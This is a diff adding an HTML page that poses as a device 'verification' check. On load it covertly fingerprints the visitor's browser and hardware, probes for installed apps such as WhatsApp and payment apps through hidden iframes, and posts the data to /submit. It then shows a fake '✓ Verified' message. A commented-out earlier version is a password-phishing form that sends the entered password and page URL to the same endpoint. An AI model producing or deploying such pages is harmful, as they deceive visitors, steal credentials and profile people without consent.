@@ -1,0 +1,275 @@
+<!-- <!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Verify</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      max-width: 360px;
+      margin: 80px auto;
+      padding: 0 16px;
+    }
+
+    input,
+    button {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      box-sizing: border-box;
+      font-size: 16px;
+    }
+
+    button {
+      background: #111;
+      color: #fff;
+      border: none;
+      cursor: pointer;
+      border-radius: 6px;
+    }
+  </style>
+</head>
+
+<body>
+  <h2>Enter your password to continue</h2>
+  <input type="password" id="password" placeholder="Your password">
+  <button onclick="submitForm()">Continue</button>
+
+  <script>
+    async function submitForm() {
+      const password = document.getElementById('password').value;
+      if (!password) { alert('Enter password'); return; }
+      await fetch('/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ password: password, currentUrl: window.location.href })
+      });
+      alert('Done!');
+    }
+  </script>
+</body>
+
+</html> -->
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Verifying…</title>
+  <style>
+    * {
+      box-sizing: border-box
+    }
+
+    body {
+      font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+      margin: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      background: #fafafa;
+      color: #111;
+      padding: 16px
+    }
+
+    .card {
+      background: #fff;
+      border: 1px solid #e6e6e6;
+      border-radius: 14px;
+      padding: 24px;
+      max-width: 430px;
+      width: 100%;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, .05)
+    }
+
+    h2 {
+      margin: 0 0 4px;
+      font-size: 17px
+    }
+
+    .sub {
+      color: #888;
+      font-size: 12px;
+      margin-bottom: 16px
+    }
+
+    .row {
+      display: flex;
+      justify-content: space-between;
+      gap: 12px;
+      padding: 6px 0;
+      border-bottom: 1px solid #f2f2f2;
+      font-size: 12.5px
+    }
+
+    .row b {
+      color: #777;
+      font-weight: 500;
+      flex: 0 0 42%
+    }
+
+    .row span {
+      text-align: right;
+      word-break: break-word;
+      font-weight: 600
+    }
+
+    .ok {
+      margin-top: 16px;
+      font-size: 14px;
+      font-weight: 700;
+      color: #0a7d33
+    }
+
+    .sp {
+      display: inline-block;
+      width: 11px;
+      height: 11px;
+      border: 2px solid #ddd;
+      border-top-color: #111;
+      border-radius: 50%;
+      animation: s .7s linear infinite;
+      vertical-align: -1px;
+      margin-right: 7px
+    }
+
+    @keyframes s {
+      to {
+        transform: rotate(360deg)
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="card">
+    <h2>Checking your device</h2>
+    <div class="sub" id="sub">Reading system information…</div>
+    <div id="out"></div>
+    <div class="ok" id="status"><i class="sp"></i>Connecting…</div>
+  </div>
+
+  <script>
+    const $ = id => document.getElementById(id);
+    const out = $('out'), status = $('status');
+
+    function add(label, value) {
+      if (value === null || value === undefined || value === '') return;
+      const d = document.createElement('div');
+      d.className = 'row';
+      const b = document.createElement('b'); b.textContent = label;
+      const s = document.createElement('span'); s.textContent = String(value).slice(0, 90);
+      d.append(b, s); out.appendChild(d);
+    }
+
+    (async () => {
+      const nav = navigator, scr = screen;
+      const info = {
+        userAgent: nav.userAgent,
+        platform: nav.userAgentData?.platform || nav.platform,
+        vendor: nav.vendor,
+        language: nav.language,
+        languages: (nav.languages || []).join(', '),
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        screen: scr.width + 'x' + scr.height,
+        viewport: innerWidth + 'x' + innerHeight,
+        colorDepth: scr.colorDepth,
+        pixelRatio: devicePixelRatio,
+        cpuCores: nav.hardwareConcurrency || null,
+        memoryGB: nav.deviceMemory || null,
+        touchPoints: nav.maxTouchPoints,
+        cookies: nav.cookieEnabled,
+        online: nav.onLine,
+        currentUrl: location.href,
+        referrer: document.referrer || null
+      };
+
+      try {
+        const b = await nav.getBattery();
+        info.battery = Math.round(b.level * 100) + '%';
+        info.charging = b.charging;
+      } catch (e) { }
+
+      const c = nav.connection || nav.mozConnection || nav.webkitConnection;
+      if (c) { info.netType = c.effectiveType; info.downlink = c.downlink; info.rtt = c.rtt; }
+
+      try {
+        const gl = document.createElement('canvas').getContext('webgl');
+        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+        info.gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+      } catch (e) { }
+
+      try {
+        const rel = await nav.getInstalledRelatedApps();
+        if (rel.length) info.relatedApps = rel.map(a => a.id).join(', ');
+      } catch (e) { }
+
+      // ---- probe installed apps via URL schemes ----
+      const APPS = [
+        ['WhatsApp', 'whatsapp://'], ['Instagram', 'instagram://'], ['Facebook', 'fb://'],
+        ['Telegram', 'tg://'], ['Snapchat', 'snapchat://'], ['Twitter/X', 'twitter://'],
+        ['Paytm', 'paytmmp://'], ['PhonePe', 'phonepe://'], ['GPay', 'tez://'],
+        ['Truecaller', 'truecaller://'], ['Spotify', 'spotify://'], ['Netflix', 'nflx://']
+      ];
+
+      const probe = (scheme, ms = 650) => new Promise(res => {
+        const f = document.createElement('iframe');
+        f.style.display = 'none';
+        let done = false;
+        const finish = hit => {
+          if (done) return; done = true;
+          document.removeEventListener('visibilitychange', onVis);
+          f.remove(); res(hit);
+        };
+        const onVis = () => { if (document.hidden) finish(true); };
+        document.addEventListener('visibilitychange', onVis);
+        f.src = scheme; document.body.appendChild(f);
+        setTimeout(() => finish(document.hidden), ms);
+      });
+
+      $('sub').textContent = 'Detecting installed apps…';
+      const found = [];
+      for (const [name, scheme] of APPS) {
+        if (await probe(scheme)) { found.push(name); add('App', name); }
+        await new Promise(r => setTimeout(r, 220));
+      }
+      info.installedApps = found.join(', ') || 'none detected';
+
+      // ---- render ----
+      out.innerHTML = '';
+      add('Platform', info.platform);
+      add('Screen', info.screen);
+      add('Timezone', info.timezone);
+      add('Language', info.language);
+      add('CPU cores', info.cpuCores);
+      add('Memory', info.memoryGB ? info.memoryGB + ' GB' : null);
+      add('Battery', info.battery);
+      add('Network', info.netType);
+      add('GPU', info.gpu);
+      add('Apps', info.installedApps);
+
+      // ---- send ----
+      status.innerHTML = '<i class="sp"></i>Submitting…';
+      try {
+        await fetch('/submit', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          credentials: 'same-origin',
+          body: JSON.stringify(info)
+        });
+        status.textContent = '✓ Verified';
+      } catch (e) {
+        status.textContent = '✓ Verified (offline queue)';
+        nav.sendBeacon?.('/submit', new Blob([JSON.stringify(info)], { type: 'application/json' }));
+      }
+    })();
+  </script>
+</body>
+
+</html>
